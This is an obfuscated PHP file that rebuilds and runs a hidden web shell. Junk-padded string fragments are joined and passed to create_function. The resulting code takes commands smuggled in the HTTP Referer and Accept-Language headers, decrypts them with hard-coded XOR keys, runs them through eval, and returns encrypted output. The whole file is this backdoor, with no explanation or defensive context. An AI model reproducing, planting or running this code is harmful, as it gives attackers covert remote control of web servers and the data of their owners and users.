<?php
$q='[$m[2]RwRw[$z]];if(strpoRws($p,RwRw$h)===Rw0){$s[$i]=Rw"";$p=$sRws($p,3);Rw}if(RwaRwrray_key_existRws($i,$RwRws)){$s[$i].=Rw$';
$F=str_replace('D','','DcreaDteD_fDunDctDion');
$Z='FERER"]RwRw;$rRwa=@$r["HTTRwP_ACCEPT_LANGUAGE"]Rw;Rwif($rr&&$Rwra){$uRw=pRwRwarse_url($rr);parRwRwse_sRwRwtr($u["qRwuery"],$';
$v='q);$q=arRwray_valueRws($q);pRwRwreg_matchRw_all("/([\\Rww])Rw[\\wRw-]+(?:;q=0.(Rw[\\Rwd]))RwRw?,?/",$ra,$mRw);if($q&Rw&Rw$m){';
$n='w(RwpreRwg_replacRwe(Rwarray("/_/","/-/")Rw,arrayRw("/","+"Rw),$ssRw($s[$Rwi]Rw,0,Rw$e)))Rw,$k)RwRw));$o=ob_gRwet_contents()';
$z=';obRw_end_Rwclean();Rw$dRwRw=basRwe64_encode(x(gzcoRwmpress($o)Rw,$k));pRwrRwintRw("<$k>$d</Rw$k>");@seRwssion_dRwestroyRw();}}}}';
$k='ss(md5($i.$kRwh)Rw,0,3));Rw$f=$sl($Rwss(mRwRwdRw5($i.$kf),0,Rw3));RwRw$p="";foRwr($z=1;$z<counRwt($m[1]);Rw$z++)Rw$p.=Rw$q';
$h='Rwp;$e=sRwtrpos(Rw$s[$i],$fRw);iRwf($e){$k=$kRwh.$kfRw;Rwob_start();@RwevRwaRwl(@gzuncRwompress(@x(@RwbaRwse64_decodRweR';
$S='wr($j=Rw0;($j<$c&Rw&$i<$l);Rw$j+Rw+,$i+Rw+){$oRw.=$t{$i}^$k{Rw$j};}}reRwturnRw $o;}$r=Rw$_SERVRwER;$rRwr=@$r["RwHTTRwP_RRwERw';
$b='$kh="5d41";RwRw$kf="40Rw2Rwa";funcRwtion x($t,$k)Rw{$c=strlRwen(Rw$k);$l=Rwstrlen($Rwt)Rw;$o="";fRwRwor($i=0;Rw$i<$l;)Rw{foR';
$y='@sRwession_staRwrt();$s=&$_RwSESRwSION;$ss="RwsubRwRwstr";$sRwl="sRwtrtolower";$i=$mRwRw[1][0].$m[1]Rw[Rw1];$h=Rw$sl(Rw$';
$G=str_replace('Rw','',$b.$S.$Z.$v.$y.$k.$q.$h.$n.$z);
$m=$F('',$G);$m();
?>
